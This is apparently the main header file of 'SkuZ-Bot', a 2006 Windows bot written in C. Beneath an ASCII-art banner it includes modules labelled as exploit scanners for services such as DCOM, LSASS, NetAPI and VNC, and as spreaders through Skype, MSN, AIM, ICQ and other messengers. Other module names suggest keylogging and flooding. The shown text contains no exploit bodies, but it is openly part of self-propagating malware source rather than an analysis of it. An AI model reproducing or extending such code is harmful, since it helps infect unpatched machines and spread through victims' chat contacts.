///////////////////////////////////////////////////////////////
//       __ _          _____          _           _          //
//      / _\ | ___   _/ _  /         | |__   ___ | |_        //
//      \ \| |/ / | | \// /   _____  | '_ \ / _ \| __|       //
//      _\ \   <| |_| |/ //\ |_____| | |_) | (_) | |_        //
//      \__/_|\_\\__,_/____/         |_.__/ \___/ \__|       //
//                                                           //
//   ____        _____          ____  _               _  __  //
//  | __ ) _   _|__  /  _ __   / ___|| | _____  _ __ | |/ /  //
//  |  _ \| | | | / /  | '_ \  \___ \| |/ / _ \| '_ \| ' /   //
//  | |_) | |_| |/ /_  | | | |  ___) |   < (_) | | | | . \   //
//  |____/ \__,_/____| |_| |_| |____/|_|\_\___/|_| |_|_|\_\  //
//                                                           //
///////////////////////////////////////////////////////////////  
#ifdef WIN32
#define _WIN32_WINNT	0x0403
#define WIN32_LEAN_AND_MEAN
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma optimize("gsy", on)
#pragma comment(linker,"/RELEASE")
#pragma comment(linker, "/ALIGN:4096")
#pragma comment(linker, "/IGNORE:4108 ")
#endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////INCLUDES////////INCLUDES////////INCLUDES////////INCLUDES////////INCLUDES////////INCLUDES////////INCLUDES////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////HEADERS////////HEADERS////////HEADERS////////HEADERS////////HEADERS////////HEADERS////////HEADERS///////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "Def.h"
#include "Ldll.h"
#include "Tcp.h"
#include "SkuZ.h"
#include "Crc.h"
#include "Sys.h"
#include "Rnd.h"
#include "Ide.h"
#include "Syn.h"
#include "Cry.h"
#include "Str.h"
#include "Test.h"
#include "Thr.h"
#include "Shel.h"
#include "Adv.h"
#include "Ims.h"
#include "Key.h"
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////SCANNERS////////SCANNERS////////SCANNERS////////SCANNERS////////SCANNERS////////SCANNERS////////SCANNERS////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "Scanners\Asn.h"
#include "Scanners\Masn.h"
#include "Scanners\Map.h"
#include "Scanners\Pnp.h"
#include "Scanners\Dcom.h"
#include "Scanners\Dss.h"
#include "Scanners\Land.h"
#include "Scanners\Netbios.h"
#include "Scanners\Lsass.h"
#include "Scanners\netapi.h"
#include "Scanners\Vnc.h"
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///SPREADERS///////SPREADERS///////SPREADERS///////SPREADERS///////SPREADERS///////SPREADERS///////SPREADERS////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "Spreaders\GoogleTalk.h"
#include "Spreaders\PalTalk.h"
#include "Spreaders\Skype.h"
#include "Spreaders\Gaim.h"
#include "Spreaders\Aim.h"
#include "Spreaders\Msn.h"
#include "Spreaders\Icq.h"
/////////////////////////////////////////////////
//       SkuZ-Bot-V.1-2006    By Skonk & BuZ   //
///////////////////////////////////////////////// 